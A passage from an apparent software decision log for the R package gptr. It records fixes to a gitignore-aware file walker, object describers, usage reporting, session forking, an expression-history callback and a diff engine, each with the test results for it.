   It evaluates nothing, it is called only for non-lazy, non-active bindings, and it treats a
   forced default (whose `missing()` is TRUE) as a value. The row has kind `value`, class
   `<missing>`, shape `""`, and no address, fingerprint or size. `<workspace>` shows
   `x  <missing>`, like `<promise>`/`<active>`. An assignment to it later is `modified`.
2. **Display text is valid UTF-8** (IC-62). An object name need not be valid UTF-8
   (`assign("\xe9t\xe9", 1)`). `workspace_lines()` threw "invalid multibyte string" in
   `nchar()`, and `changes_lines()` warned "unable to translate". Names, classes, shapes and
   `user ran:` text now pass `env_text()`: `as_utf8()`, then `<xx>` byte escapes for whatever is
   still invalid. Snapshot `name`s keep the exact binding names, because later `get()` calls and
   diffs use them.
3. **Counts ignore `OutDec`.** `env_fmt_n()` passes `decimal.mark = "."`. Under
   `options(OutDec = ",")`, `format()` warned that both marks are `,`.
4. **No quadratic loops, same output.**
   - The snapshot loop fills plain vectors and builds the data frame once, and it matches
     `previous` once. Writing data-frame cells copied a column per binding: 20,000 bindings took
     3.27 s, now 1.05 s.
   - `changes_lines()` cuts more than `budget + 1` lines before its line-by-line trim. Every
     line costs more than one estimated token, so those lines never fit, and the result is the
     same. A 20,000-name diff took 32 s, now 0.03 s, with the same 47 lines.

Validation: `progress/P09.md`, Task 2. Four blocks (21 expectations) and one copy row were added
to the plan's tests, which are unchanged. Against the plan-literal source the four blocks gave
`[ FAIL 4 | WARN 1 | SKIP 0 | PASS 51 ]`. The final result for `env-snapshot|copy-eval` is
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 69 ]`, and `^env-snapshot$` under `LC_ALL=C` passes 66.

## D-041 - P10 walker: the prune list always wins at the walk root, git's bracket-expression rules, one ignore-file precedence, non-ASCII, invalid and newline names, a git root at "/" (2026-10-04)

P10 Task 2's plan-literal `R/tool-walk.R` (`walk_files()`, `glob_to_regex()`, the `.gitignore`
engine; an L4 service that P11, P16 and P18 consume) had four defects. Its own 48 expectations
pass against the literal source; each defect below was shown by an added test against that
source (`dev/.validation/P10/task2-red-plan-literal.log` and `...-clocale.log`; items 5-7, found
in review round 1, by `task2-fix1-red.log`; items 8-9, found in review round 2, by
`task2-fix2-red*.log`). No exported signature changes; the returned data frame gains one
attribute, `invalid_names` (item 7); `glob_to_regex()` can now raise `invalid_argument` for a glob
that has no valid translation (item 8); the internal `glob_translate()` takes `git` instead of the
plan's `braces` (item 8).

1. **The prune list always wins** (contract section 7.10: the walker "skips `.git`,
   `node_modules`, `renv`, `.venv`, `__pycache__`"; report 11 section 4.5: "always pruned").
   The plan compiled the prune list as the first ignore rules, so a later negation in an ignore
   file re-included a pruned directory. The common whitelist `.gitignore` (`*`, `!*/`, `!*.R`)
   made the walker descend `.git/` and `node_modules/` and return `.git/hooks/h.R` and
   `node_modules/m/x.R`. `walk_tree()` now evaluates the prune rules on their own (still with
   the plan's anchoring and last-match-wins inside the list) and drops every entry they match
   before the ignore rules are consulted. `prune = character()` still turns pruning off.
2. **Bracket classes.** `glob_translate()` escaped the `]` that closes a POSIX class, so
   `[[:digit:]]` matched the set `{[ : d i g t ]}` instead of a digit (in globs and in ignore
   files), and it left a leading `]` unescaped after the `[^/` it emits for `[!...]`, so `[!]a]b`
   compiled to "one non-slash character, then `a]b`". The new `glob_class_body()` kept a known
   POSIX class verbatim and escaped every other `[`, `]` and backslash (superseded by item 8).
3. **One ignore-file precedence.** The plan reads an ancestor directory's ignore files in the
   order `.gitignore`, `.ignore`, `.gptrignore` (the last match wins, so `.gptrignore` wins) but
   a walked directory's in `list.files()` order, where `.ignore` sorts last. The same tree then
   gave different file sets when walked from its root and from a subdirectory. Walked
   directories now use the ancestors' order.
4. **Non-ASCII paths in a non-UTF-8 locale** (IC-62; architecture section 6.6; the hosted
   `LC_ALL=C` job). `basename()` and `dirname()` stop with "unable to translate ... to native
   encoding" on a marked UTF-8 non-ASCII string there, so `walk_files()` failed for any
   non-ASCII root (`fs_case_insensitive()`, `git_root_of()`) or entry name (`ignore_eval()`).
   The basename is now taken with `sub()` (`"(?s)^.*/"` since item 9), the two root helpers work
   on the unmarked bytes of `fs_path()` (and `git_root_of()` returns `as_utf8()`), and
   `resolve_tool_path()` passes `fs_path(p)` to `path.expand()`.
5. **The prune list is anchored at the walk root.** The plan matched the prune list, like the
   ignore rules, against paths relative to the git root, so its anchored entries
   (`renv/library/`, `renv/staging/`, `renv/sandbox/`, `packrat/lib*/`, `packrat/src/`) never
   applied when the walked directory was a subdirectory of a repository: `walk_files("proj")`
   below a git root returned `renv/library/pkg/DESCRIPTION` while `walk_files("proj",
   gitignore = FALSE)` pruned it (the prune list does not depend on git; report 11 section 4.5,
   "git does not know gptr's default prune list"). The prune rules are now matched against the
   path relative to the walk root, in both modes, as report 11's ripgrep accelerator does with
   `wd = root`; ignore-file rules stay relative to the git root. Walking `renv/` itself now
   lists `library/` unless an ignore file excludes it (renv's own `renv/.gitignore` does); an
   explicit path inside a pruned directory was already honoured (report 11 risk 8).
6. **A git root at the file-system root.** `git_root_of()` returns `/` or `C:/` there (with the
   slash), and the plan's `substring(root, nchar(groot) + 2L)` then dropped the first character
   of the relative prefix (`rivate/tmp/proj`), so ancestor ignore files were looked up at wrong
   paths and silently skipped and anchored rules never matched. The prefix is measured, and the
   ancestor and `.git/info/exclude` paths are joined, on the git root without trailing slashes.
7. **Entry names that are not valid UTF-8** (IC-62 ingress). A name `as_utf8()` cannot repair
   (for example Latin-1 bytes on Linux in a UTF-8 locale) stopped the whole walk in
   `tolower()`/`sub(perl = TRUE)` (the plan's `tolower()` sort already failed on it). No UTF-8
   path can name such an entry, and passing its bytes on would break JSON output downstream, so
   the walker skips it right after listing (a directory is not descended) and counts it in the
   new `invalid_names` attribute of `walk_tree()` and `walk_files()`, which P11's `find`/`ls`
   can report. The listing goes through the new one-line helper `walk_list_dir()` so a test can
   inject such a name (APFS cannot create one).

8. **Bracket expressions follow git's wildmatch and always compile** (contract section 7.10:
   `glob_to_regex()` returns a PCRE). Item 2 still emitted an invalid PCRE for legal patterns: a
   class body that starts and ends with `:`, `.` or `=` (`[:digit:]`, `[=a=]`, the typo
   `[[:digit:]`), a reversed range (`[z-a]`) or a `-` next to a POSIX class (`[[:digit:]-z]`). One
   such line in any ignore file stopped the whole walk with a base-R error and a leaked PCRE
   warning, and `glob_to_regex()` returned a pattern that does not compile. `glob_class()` now
   replaces the plan's class scan and `glob_class_body()` with one parser that follows git's
   wildmatch: after `!`/`^` a first `]` is literal, a backslash escapes the next character (the
   plan kept it literal; `[\]]` is the set `{]}`), `-` is literal first, last or right after a
   range or class, `[:name:]` closes at the first `]`, and every character is emitted escaped or
   inside a range, so a class always compiles (`[:digit:]` is the set `{: d i g t}`). In ignore
   files (`glob_translate(git = TRUE)`, which replaces the plan's `braces = FALSE`) the rest of
   wildmatch applies: a reversed range keeps only its first character (`[z-a]` matches `z`); an
   unclosed bracket expression or an unknown class name (`foo[bar`, `[[:word:]]`) matches nothing,
   so the rule is dropped; a class never matches `/`; on a case-insensitive file system
   (`core.ignorecase`, `fold = TRUE`) class characters are compared as written (`[A]` matches
   nothing), a range also matches a lower-case letter whose capital it holds (`[*-a]` matches `b`),
   `[:upper:]` and `[:lower:]` match every letter, and an escaped capital (`\A`) never matches. In
   globs a reversed range or an unknown class name is an `invalid_argument` error (fd/globset
   rejects a reversed range) and an unclosed `[` stays literal (plan). Brace alternation skips
   escaped braces (`{a,\}` is literal). Safety net: `ignore_compile()` drops a rule whose PCRE does
   not compile and `glob_to_regex()` raises `invalid_argument` for one (`{a,[}]`), both through
   P02's `spec_regex_ok()` (`ext-specs.R`, L0). A scratch oracle of 114 one-line ignore files
   (bracket edge cases and case-folding probes) agrees with `git ls-files` with `core.ignorecase`
   true and false and in the UTF-8 and C locales, except one known difference kept by design:
   wildmatch compares bytes, so `?` or a class matches one byte of a multi-byte UTF-8 character
   there (`?[A-Z]` matches `\u00c9t` in git); the walker matches characters.
9. **Names holding a newline.** Item 4's `sub(".*/", ...)` stops at a newline (PCRE `.`), so the
   basename of `x\ny/z.log` was `x\nz.log` and unanchored rules missed it (the plan's
   `basename()` was right). The `.*` of emitted patterns (`**`, the `(?:.*/)?` prefix of
   `glob_to_regex()`) did not cross a newline either, and `$` also matches before a final newline.
   The basename is now `sub("(?s)^.*/", ...)` and `glob_anchor()` anchors every emitted PCRE as
   `(?s)^...\z`, in ignore rules and in `glob_to_regex()` (whose result now starts with `(?s)`;
   its consumers use it with `perl = TRUE`). Git and fd match such names the same way.

Validation: `progress/P10.md`, Task 2 (`test-tool-walk.R`). Ten blocks were added, 30
expectations: "bracket classes keep POSIX classes and a literal `]` after the negation" (4),
".gptrignore wins over .ignore, which wins over .gitignore, at every level" (2), "a negation in
an ignore file never re-includes a pruned directory" (2), "non-ASCII directory and file names
are walked and matched in any locale" (3), "the prune list is anchored at the walk root, also
below a git root" (2), "a git root at the file-system root keeps the ancestor rules" (1, with
`git_root_of()` mocked) and "an entry whose name is not valid UTF-8 is skipped and counted,
never fatal" (2, with `walk_list_dir()` mocked); "bracket expressions follow git's wildmatch and
always compile" (9), "case folding inside brackets follows git's wildmatch (core.ignorecase)" (2,
with `fs_case_insensitive()` mocked both ways) and "a file name holding a newline is matched like
git" (3, skipped on Windows). Against the plan-literal source:
`[ FAIL 5 | WARN 0 | SKIP 0 | PASS 54 ]` in a UTF-8 locale, `[ FAIL 6 | WARN 0 | SKIP 0 |
PASS 51 ]` under `LC_ALL=C` (items 1-4, before items 5-7 existed). Items 5-7 against the round-0
source: `[ FAIL 3 | WARN 0 | SKIP 0 | PASS 60 ]`. Items 8-9 against the round-1 source:
`[ FAIL 4 | WARN 0 | SKIP 0 | PASS 64 ]` (the bracket block stops at its first walk with the
invalid-PCRE error; its 7 glob expectations all fail there too, `task2-fix2-red-globs.log`), and
the case-folding block against the parser without folding `[ FAIL 1 | WARN 0 | SKIP 0 |
PASS 77 ]`. Green is `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 78 ]` in both locales: the plan's 48
expectations, unchanged, plus these 30.

## D-042 - P06 gptr_usage(): unknown usage prints as unknown, an unknown model is the NA group, the System 1 log is read without a catch-all (2026-10-04)

P06 Task 11's literal `gptr_usage()` predates IC-74 (07-local-ollama.md section 5: "Missing usage
remains unknown"). The behaviour now, which Task 15's `ctx$usage()`, P08's printing and P19's
team and fan-out containers consume:

1. **The footer prints unknown usage as unknown.** The cost goes through `format_cost()` (D-024):
   `unknown cost` when any included cost is unknown, never `$NA`; the tokens in (input plus cache
   reads) go through `format_count()`: `unknown tokens in`. A known zero stays `$0.0000`. One
   request reads `1 request`. Group sums and the `totals` attribute stay the plan's `sum()`
   without `na.rm`, so a group or total that includes an unknown value is `NA` (now tested).
2. **`by = "model"` groups an unknown provider or model as `NA`.** The plan pasted
   `provider/model`, which turned unknown parts into invented model names (`"NA/NA"`,
   `"fake/NA"`) and split the unknown requests over several groups.
3. **`x = NULL` reads P05's `usage_log()` without a catch-all.** The plan wrapped it in
   `tryCatch(..., error = function(e) NULL)`, which would silently drop the System 1 requests
   from the totals. `usage_log_append()` validates every row, so `usage_log()` does not fail on a
   well-formed log; a failure now surfaces instead of an understated total.

`detail = TRUE` is not a deviation: as planned, it binds the given sessions' own ledgers
(`ledger_add()` writes to the requesting session only), so a child's requests are in the child's
ledger and the last row is the session's own last request, which P14's `/context`
(`cmd_context()`) reads. Contract 04 section 6.5 rolls children up only for `detail = FALSE`.

Validation: `progress/P06.md`, Task 11 (`test-session-budget.R`; the added tests failed 7
assertions against the plan-literal code, and every plan test passed against both).

## D-043 - P09 describers: list, matrix and data frame columns, invalid UTF-8, missing arguments, reference class objects and S4 slots; silent and within budget; method results that are not lines (2026-10-04)

P09 Task 3's plan-literal `R/env-describe.R` was changed in the eight ways below. Items 1-7 were
found by a probe of the plan-literal source (`dev/.validation/P09/task3-probe-plan-literal.log`,
script `task3-probe.R`), item 8 by the task review. The descriptions of the plan's 20 fixture objects are unchanged byte for byte
(`task3-facts-plan-literal.log` and `task3-facts-adapted.log`: 92 of G2's 98 facts, the longest
130 tokens). No signature, condition class or exported behaviour of 04 section 6.6 changes.

1. **Data frame columns that are not plain vectors.** A list column (tibble list columns), a
   matrix column (`df$m = matrix(...)`, `scale()` results) or a data frame column (packed
   columns, nested `jsonlite::fromJSON()` results) made the data frame method throw while it
   built the rows level: "arguments imply differing number of rows", or "argument must be
   coercible to non-negative integer" after a 'length.out' warning, or tibble's recycling error.
   `describe_value()`, which Task 10's `attached` block calls, threw; `describe_binding()` fell
   back to the default method (`<data.frame> 3 x 2`, `typeof list`). The new leaf
   `dsc_leaf_col()` samples values of plain vectors only. Other columns give class and shape:
   `$ l <list> length 3`, `$ m <matrix> 3 x 2`, `$ inner <data.frame> 3 x 2`, and cells such as
   `<list>` in the rows.
2. **Text that is not valid UTF-8** (IC-62). Invalid bytes in list or data frame names, factor
   levels or list strings made P01's `est_tokens()` (a PCRE `gsub()`) or `substr()` throw
   ("input string 1 is invalid UTF-8", "invalid multibyte string"). Every level passes Task 2's
   `env_text()` before it is measured, so the lines are valid UTF-8 with `<xx>` escapes.
   `describe_binding()` shows the name the same way.
3. **Missing arguments.** An environment that holds R's missing argument (the frame of a call
   that left a formal unsupplied) made `dsc_env_is_fun()`'s `get()` throw. It now reads the
   binding with `.subset2()`, which returns the missing argument as a value. `describe_binding()`
   of a missing argument or of empty `...` gave `<?> (describe failed: argument "n" is missing,
   ...)`. The failing `get()` also left the function-frame home on its unwound frame: a
   fresh-process row against the plan-literal source counts `1 copies of big` on the next edit
   (D-040 item 1 found the same for the snapshot). It now returns `name: <missing>`, Task 2's
   `<missing>`, checked with `env_snap_missing()` before any `get()`.
4. **Reference class objects.** S3 dispatch sends an RC object (S4, extending `environment`) to
   `gptr_describe.environment()`, where rlang's binding predicates refused it (`` `env` must be an
   environment ``). `dsc_leaf_env()` reads its `as.environment()`.
5. **S4 slots.** A slot holding `NULL` is stored as R's pseudo-NULL symbol and was shown as
   `<name> length 1`; it is now `<NULL> length 0`. When methods has no definition of the class
   (its package is not installed), `methods::slotNames()` is empty and the header ended in
   `slots: `. The slot names now come from the attribute names (slots are attributes; IC-71).
6. **Silent and within budget.**
   - The lm method calls `summary()` under `suppressWarnings()`: its "essentially perfect fit"
     warning reached the caller.
   - Strings are cut to 40 characters in the character examples and the data frame rows. One
     300-character cell pushed a data frame's rows level to 603 tokens.
   - `dsc_fit()` also cuts a first line that alone overruns the budget. A third-party method with
     a 2,100-character header gave 888 tokens at budget 20. The `<?>` note passes `dsc_fit()`.
7. **A forced `level` is a whole number of at least 1** (04 section 2.2). `level = 0` was clamped
   to 1 and `level = NA` returned `NULL`. Both now signal `gptr_error_invalid_argument`; a level
   above the method's last still gives its richest.
8. **A method result must be lines** (04 section 6.6: "the first a header"). The harness passed
   a third-party method's `character(0)`, `NULL` or `NA_character_` through:
   `describe_value()` returned `character(0)` or `NA`, and `describe_binding()` built `q: NA`. A
   method returning an environment made `as.character()` throw. The new helper `dsc_lines()`
   accepts a non-empty atomic vector without `NA`. For anything else, `describe_value()` returns
   the default method's description, and a forced-level retry that is not lines is skipped. This
   is checked rather than signalled, because an error would unwind `describe_value()`, which holds
   the object (see the known limit below). A fresh-process probe counts 0 copies on the next edit
   for the `NULL`, `character(0)` and `NA` fallbacks (`task3-fix1-copy-probe.log`).

Known limits (R semantics, not changed):
- S3 dispatch on an S4 object whose class's package is installed but not loaded loads that
  namespace (`UseMethod()`, `inherits()` and `length()` all do), so neither the generic nor a
  method can prevent it (`task3-s4-namespace-load.log`).
- **A method that throws costs one copy** of the described object, an exception to [R4] on the
  "errors caught" path (04 section 7.9). This is the plan's design, not a change. The error
  unwinds `describe_value()`, the generic and the method with a longjmp. Their bindings (the
  argument promises) hold the object, and R releases a closure frame's references
  (`R_CleanupEnvir()`) only when it returns normally. The user's next in-place edit copies once.
  After that the new object is referenced once again, so the cost is one copy per failure.
  `describe_binding()` still returns the default method's lines. No R-level code can avoid this,
  because the method's own frame binds the object. The added row in `test-copy-eval.R`
  (`allow = 1L`) catches any regression beyond one copy. Methods that return normally, built-in
  or third-party, cost none.

Validation: `progress/P09.md`, Task 3. Eleven blocks (54 expectations) and two copy rows were
added to the plan's tests, which are unchanged. Against the plan-literal source:
`[ FAIL 15 | WARN 0 | SKIP 0 | PASS 103 ]` (items 1-7; item 8's red is in the review round 1 entry).
Final `env-describe|copy-eval`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 160 ]`; `^env-describe$` under
`LC_ALL=C` passes 153.

## D-044 - P06 gptr_fork(): a cut keeps the entries that close its turn, an empty or oversized entry id is a classed refusal, a cancel reason must be one string, the IC-53 refusal names level 4, a cut inside a turn keeps only the values recorded before it, a fork that copies no gptr.frozen entry freezes its own, forkOf.entry is an entry the fork copied (2026-10-04)

P06 Task 12's plan-literal `gptr_fork()` passes all of the plan's tests against the real P01-P05
and P06 Tasks 1-11 code. Seven details changed, each shown by an added test against that source
(item 5 was found in review round 1, items 6 and 7 and the oversized id of item 2 in round 2):

1. **A cut at the end of a turn keeps the entries that close the turn.** The plan's
   `fork_boundaries()` placed a boundary on a message only, so `at = NULL` and `at = k` cut
   before the entries that follow the turn's last message. The turn's `gptr.value` is such an
   entry: `session_value_set()` (Task 4) appends it after the answer, and so do Task 9's
   `run_returns()` and P08's gateway when they designate the value of a call. The fork kept the
   value in memory (`fd$values`), but not in its transcript or its file. Task 13's planned
   `store_rebuild()` restores values from the `gptr.value` entries of the path
   (`rebuild_values()`), so a resumed fork would have lost the value of its last copied turn.
   For an idle source, `gptr.forkOf.entry` was also not the source's leaf (S22 asserts that
   equality; it held only while nothing followed the final answer). Now a boundary extends over
   the entries that directly follow it and carry no message: a value, a model or mode change
   made after the answer, a compaction, a label (still dropped by `store_fork()`). Operator
   messages (`custom_message`) are relays for the model's next step and never extend a boundary.
   Which messages are boundaries (no tool call awaiting its result, error and aborted replies
   skipped) is unchanged, and so are a running source's cut and the turn numbers.
2. **An empty or oversized entry id is refused with `gptr_error_invalid_argument`** (`arg = "at"`,
   04 section 1.1), before `session_before_fork` is emitted, as a malformed number already is.
   The plan's `exists("", envir = d$index)` raised base R's unclassed "invalid first argument",
   and `exists()` of a string over 10000 bytes raises the unclassed "variable names are limited
   to 10000 bytes" (no such string can name an entry of `.d$index`).
3. **A cancel's reason is used only when it is one non-empty string**; otherwise the message says
   "no reason given". The plan pasted a vector reason into a message of several lines and read
   `dec$cancel`/`dec$reason` with `$`, which matches prefixes (D-030 item 8 precedent: exact
   `[[`).
4. **The IC-53 refusal of `session_control_check()` carries `risk = 4L`**, the level of the
   `control` category (IC-53 item 3), as P02's `ext_control_guard()` and P08's planned
   `control_check()` do. The plan gave `risk = NULL`. The tool name is read with `[[`.
5. **A cut inside a turn keeps only the values recorded before the cut.** The plan kept every
   value of the turns up to the cut's turn (`turn <= cut turn`). An entry-id cut can fall inside
   turn `k`, at its prompt or at its answer, before the `gptr.value` entries that close the turn.
   The fork then reported turn `k`'s value (`f$value`) although neither its transcript nor its
   file held the entry, so a resume (Task 13's planned `rebuild_values()`) would lose it: the
   mismatch item 1 removes for `at = NULL` and `at = k`. `fork_values()` starts from the plan's
   set and, for each `gptr.value` entry on the source path that the cut leaves out, drops the
   latest record of that turn and name (`session_value_set()` appends record and entry
   together). Records without an entry (the plan's value test sets `d$values` directly) still
   follow the turn rule. An integer or `NULL` cut of an idle source keeps the plan's set, since
   its boundary ends after the turn's closing entries (item 1), unless something that is not a
   closing entry separates a value entry from the answer; a running source's cut, which can fall
   between two tool rounds of the running turn, gets the same check.
6. **A fork that copies no `gptr.frozen` entry freezes its own prompt.** The plan set
   `fd$frozen = d$frozen` for every cut. A cut that copies nothing (`at = 0`, or `at = NULL` on a
   source with no closed boundary yet: still running, or failed in, its first turn) then shared
   the source's frozen prompt in memory, so the fork's first run skipped the freeze and its file
   never got a `gptr.frozen` entry, against 04 section 11.4 ("The first entry of every session is
   `gptr.frozen`"); P07's planned resume and Task 13's planned `rebuild_frozen()` read the prompt
   back only from that entry. Now `fork_frozen()` shares the source's prompt only when the copied
   path holds the `gptr.frozen` entry it came from (the last one on the source path); otherwise
   the fork freezes at its first run (its `session_start` there has reason `fork`, Task 9) and
   its file starts with its own `gptr.frozen`. Every cut that copies the source's freeze still
   shares the prompt, so a fork's first request re-reads the source's cached prefix (03 section
   10.2 item 5). The plan's `at = 0` test (no entries) is unchanged. Copying the source's
   `gptr.frozen` entry into an empty cut was not chosen: it changes that plan test, and `at = 0`
   is an empty conversation (04 section 5.1).
7. **`gptr.forkOf.entry` (`.d$fork_of$entry`) is the last entry the fork copied.** The plan used
   the cut entry, which can be a label: an entry id `at` naming a label (S23's scenario), and,
   since item 1, a boundary extended over a trailing label at `at = NULL` or `at = k`.
   `store_fork()` drops labels, so the id was in neither the fork's transcript nor its file.
   P16's planned `ckpt_rewind_ops(tree, target, d$fork_of$entry)` finds the copied range in the
   fork's own tree from that id, so a missing id gave an empty range, and a rewind of the fork
   would have undone the source's copied `gptr.checkpoint` records. The id is now `fd$leaf` after
   `store_fork()`, which equals the cut whenever the cut is not a label (S22 unchanged).

Not behavioural: the source's rank-0 specs are registered for the fork after `session_new()`
returns, so the fork's finalizer (`session_shutdown`, P02's `registry_session_drop()`) removes
them if a later step fails. The plan registered them first, under a fresh id that no live
session might ever hold.

Validation: `progress/P06.md`, Task 12. Twelve blocks (89 expectations) were added to the plan's
tests, which are unchanged. Against the plan-literal source, before review round 1:
`[ FAIL 13 | WARN 0 | SKIP 0 | PASS 403 ]`, all 13 in the seven blocks added then. The eighth
block (item 5), against the plan's value filter: 5 of its 9 expectations failed
(`^session-object$`: `[ FAIL 5 | WARN 0 | SKIP 0 | PASS 328 ]`). The four blocks of review round
2 (items 2, 6 and 7), against the round-1 source: 17 of their 29 expectations failed
(`^session-(object|store)$`: `[ FAIL 17 | WARN 0 | SKIP 0 | PASS 437 ]`). Final
`^session-(object|store)$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 454 ]`.

## D-045 - P09 user-expression log: the task callback walks every call linearly, default arguments included, and deparses nothing nested past 5,000 calls, a deparse() error becomes a note, multi-line expressions are one line, a removed callback is registered again, session ids are checked (2026-10-04)

P09 Task 4's plan-literal `R/env-history.R` (`user_log_push()`, `user_log_is_gptr()`,
`user_log_start()`, `user_log_stop()`) was changed in the ways below. Each was found by a probe of
the plan-literal source (`dev/.validation/P09/task4-probe-plan-literal.log`,
`task4-probe-callback-plan-literal.log`, `task4-probe-deep-plan-literal.log`). The internal
signatures, the callback name `gptr_history`, the 20-entry and 120-character limits and
`user_expr_log()` are unchanged. The plan's `user_log_is_gptr()` is replaced by
`user_log_scan()`, and the `active` field of `user_log_state` is gone (nothing outside the file
read it).

R calls a task callback through `R_tryEval()`. When the callback signals an error, R prints that
error at the user's prompt and removes the callback, so logging stops for every live session.
The callback therefore must not throw on any expression the parser can produce.

1. **A linear, non-recursive walk.** The plan's recursive walk read `expr[[i]]` for each
   argument. On a call that is a pairlist this is quadratic. Pasting one `x = c(<100,000
   numbers>)` line (a `dput()` of a long vector) made the callback run for 515 s before the
   next prompt. A 20,000-term expression, such as a generated function body, overflowed R's
   node stack. R then printed "node stack overflow ... user_log_is_gptr" and dropped the
   callback. `user_log_scan()` now walks the call tree breadth-first with `as.list()`. The same
   line takes 0.024 s. The children of a level are joined with
   `unlist(recursive = FALSE, use.names = FALSE)` (review round 2). The first version joined
   them with `do.call(c, ...)`, which passed their argument names to `c()`: a child under an
   argument named `recursive` or `use.names` bound to that formal, and the walk stopped there.
   `f(recursive = g(gptr("p")))` was logged, and a 6,000-level body under `recursive =` reached
   `deparse()` past the cap of item 2 (at 100,000 levels R segfaulted, per the reviewer).
2. **Expressions nested more than 5,000 calls deep are not deparsed.** The new walk alone moved
   the failure into `deparse()`, which recurses in C. At about 100,000 levels it ends in
   "segfault from C stack overflow", which no handler catches. The walk counts levels and stops
   at R's default `expressions` limit. Such an entry is logged as
   `<expression nested more than 5000 calls deep>`. The levels include the default arguments
   of `function()` (review round 3). Its formals are a pairlist, not a call, and the first walk
   kept only calls, so it never looked inside a default: `f = function(x = a + ... + a) 1` with
   100,000 terms scanned as two levels deep, reached `deparse()` and segfaulted in a child
   Rscript, and R dropped the callback (with 6,000 terms a 120-character text was logged
   instead of the note). `g = function(x = gptr("p")) x` was logged. The walk now adds the
   elements of each pairlist child to the same level; a missing default (an empty symbol) is
   not a call and ends there, as the empty argument of `x[, 1]` does.
3. **Multi-line expressions are one line** (04 section 7.9: "deparsed and cut to 120
   characters"). With `nlines = 1L`, the plan logged only the first deparsed line: `{`,
   `for (i in 1:3) {`, `f = function(x) {`, `if (TRUE) {`. The lines (at most 120) are now
   trimmed and joined, with `"; "` between statements: `for (i in 1:3) { y = i; z = y + 1 }`.
   A break inside one statement takes a space. Inside braces `deparse()` breaks an `if` after
   `if (cond) ` and before `else`, and past 500 bytes it breaks after `, ` or a binary operator.
   The glue is a space when the untrimmed line ends with `{` or with a space (`deparse()` leaves
   one at each break inside a statement) or the next line starts with `}` or the word `else`.
   The first version (review round 2) used only the braces, so `{ if (x) y else z }` was logged
   as `{ if (x); y; else z }`, which is not the code typed. Applied without the cut to every
   function body of base, stats, utils, methods, tools and graphics that deparses to 2 to 120
   lines (2,891), the one-line text parses to the same expression as the multi-line deparse
   for all of them; the first rule failed for 2,260 (`task4-fix2-probe-corpus.log`,
   `task4-fix2-probe-corpus-oldglue.log`).
4. **The entry is valid UTF-8 before it is cut** (IC-62; conventions section 4: console input
   passes `as_utf8()`). The deparsed text goes through Task 2's `env_text()`, so `nchar()` and
   `substr()` count characters in every locale.
5. **Registration follows R's callback list, not a flag.** The plan registered only while its
   own `active` flag was FALSE. After R dropped the callback (item 1), or the user removed it by
   position (`removeTaskCallback(1)`), the flag stayed TRUE, and a new session never registered
   the callback again. `user_log_start()` now checks `getTaskCallbackNames()`, and
   `user_log_stop()` removes every callback named `gptr_history`.
6. **`gptr:::gptr(...)` and `"gptr"::"gptr"(...)` are filtered** like `gptr::gptr(...)`. They
   too are calls of `gptr()`. Other functions of the package, such as `gptr::gptr_last()`, are
   still logged.
7. **Session ids are checked** (04 section 2.2). `user_log_start(NULL)` registered a callback
   with no session to release it, and `user_log_start(NA)` stored an `NA` session. Both now
   signal `gptr_error_invalid_argument` before anything changes.
8. **An error from `deparse()` becomes a note** (review round 1). `deparse()` signals an error
   on two kinds of input that the parser accepts and that evaluate without error. Both made R
   print the error at the prompt and drop the callback (`task4-fix1-probe-before.log`).
   - In a UTF-8 locale (the default on macOS, Linux and Windows R >= 4.2), a backtick name
     whose `\x` escapes are not UTF-8: `` `\xff` = 1 ``, `` x = list(`\xfe` = 1) ``,
     `` f = function(`\xff`) 1 ``. The error is "invalid multibyte string at '<fe>'".
   - A chain of calls `f(1)(1)...(1)` typed as a whole top-level expression, where `f` returns
     itself. With an 8 MB C stack, `deparse()` fails its C stack check from about 800 calls,
     far below the 5,000-call cap of item 2 (`task4-fix1-probe-shapes.log`). A bigger stack
     only moves the threshold.
   `user_log_text()` now runs the text step (`user_log_line()`, the former body) in
   `tryCatch()`, and any error there is logged as `<expression that cannot be deparsed>`. Its
   frame holds only `expr`, never the callback's `value`, so R3 holds: the copy row still
   counts 0 copies. A probe of other parser shapes found no other failure: `- - a`, `!!a`,
   `a$a`, `a[1][1]`, `~ ~ a`, pipes and `+` deparse at 4,999 levels; `^`, `=`, `function()` and
   `if` do not parse at 4,999 levels and deparse at 2,000 (`function()` at 1,000; it does not
   parse at 2,000).

Copy safety (R1-R3). A new fresh-process row in `test-copy-eval.R` runs three top-level lines
that hand `big` itself to the live callback as `value`. The next edit is in place, with 0 copies.
A negative control with the same script (`task4-copy-negative-control.log`) shows a callback
that keeps the values it is handed costs 1 copy, which the row would catch.

Validation: `progress/P09.md`, Task 4. Ten blocks (62 expectations) and one copy row were added
to the plan's tests, which are unchanged. Against the plan-literal source the first seven added
blocks gave `[ FAIL 16 | WARN 0 | SKIP 0 | PASS 24 ]`. The two blocks of item 8 and its line in
the fresh-process block failed against the source before item 8 (`[ FAIL 5 | WARN 0 | SKIP 0 |
PASS 41 ]`, `task4-fix1-red.log`). The review round 2 expectations (the glue of item 3, the
argument names of item 1) failed against the source before that round (`[ FAIL 6 | WARN 0 |
SKIP 0 | PASS 54 ]`, `task4-fix2-red.log`). The review round 3 block (the defaults of item 2)
failed 3 of its 8 expectations against the source before that round (`[ FAIL 3 | WARN 0 |
SKIP 0 | PASS 71 ]`, `task4-fix3-red.log`). Final `^env-history$`:
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 74 ]`, the same under `LC_ALL=C`. `^copy-eval$`: 8 passes.

## D-046 - P10 diff engine: collision-free no-newline keys, validated diff_unified() arguments, a clamped context, O(D^2) Myers memory, linear hunk rendering and an O(n log n) LIS (2026-10-04)

P10 Task 3's plan-literal `R/tool-diff.R` had six defects, all reproduced against that source:
1. **The no-newline sentinel could collide.** `diff_unified()` keyed a last line lacking its
   newline as `paste0(line, "\001<no-eol>")`. A line that has its newline and ends in that text
   matched it, so `diff_unified("f", "x\001<no-eol>\n", "x")` returned `character()`, which
   claims two different texts are equal.
2. **`diff_unified()` did not validate its arguments.** An `NA` text rendered as `-NA`, and a
   vector text stopped with a base error.
3. **A large `context` overflowed.** `context` near `.Machine$integer.max` overflowed
   `2L * context + 1L`.
4. **Myers memory was O(D * (n + m)).** The Myers trace kept a full copy of `v` for each of up to
   257 rounds: a 100,000-line total rewrite grew the heap by 401.8 MB, and 1,000,000 lines would
   have needed about 4 GB. The plan's backtrack loop `seq.int(d, 1L, by = -1L)` also errors at
   d = 0.
5. **Rendering was quadratic in the number of hunks.** 20,000 hunks over 200,000 lines took
